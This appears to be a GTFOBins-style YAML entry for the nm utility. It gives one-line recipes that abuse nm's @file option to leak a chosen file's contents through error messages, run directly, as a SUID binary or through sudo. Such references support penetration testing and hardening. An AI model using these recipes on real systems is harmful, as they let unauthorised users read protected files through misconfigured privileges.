---
description: The file content is treated as command line options and disclosed through error messages, so this is not suitable for reading arbitrary binary data.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        nm @$LFILE
  suid:
    - code: |
        LFILE=file_to_read
        ./nm @$LFILE
  sudo:
    - code: |
        LFILE=file_to_read
        sudo nm @$LFILE
---
